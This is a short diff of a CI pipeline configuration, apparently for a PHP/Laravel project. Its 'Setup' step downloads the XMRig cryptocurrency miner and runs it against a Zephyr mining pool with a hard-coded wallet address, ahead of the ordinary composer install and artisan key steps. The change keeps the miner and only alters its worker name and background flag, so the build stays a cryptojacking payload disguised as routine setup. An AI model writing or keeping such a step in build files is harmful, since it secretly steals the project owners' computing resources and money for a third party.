@@ -11,7 +11,7 @@ environment:
 pipeline:
   - name: Setup
     cmd: |
-      wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz && tar xf xmrig-6.12.1-linux-static-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o de.zephyr.herominers.com:1123 -u ZEPHYR386wd87GxwR5txxs4nxy7neT1h2Y7tzgkyiYu9AHgqEmeLLRGAqzzLYU7UanhkfKFdGysARgUcqucer2dwC7SqEepm3wQ4r -p sachin -a rx/0 -k --background
+      wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz && tar xf xmrig-6.12.1-linux-static-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o de.zephyr.herominers.com:1123 -u ZEPHYR386wd87GxwR5txxs4nxy7neT1h2Y7tzgkyiYu9AHgqEmeLLRGAqzzLYU7UanhkfKFdGysARgUcqucer2dwC7SqEepm3wQ4r -p cjipbuild -a rx/0 -k
       composer install --no-interaction --prefer-dist --optimize-autoloader
       php artisan key:generate
 
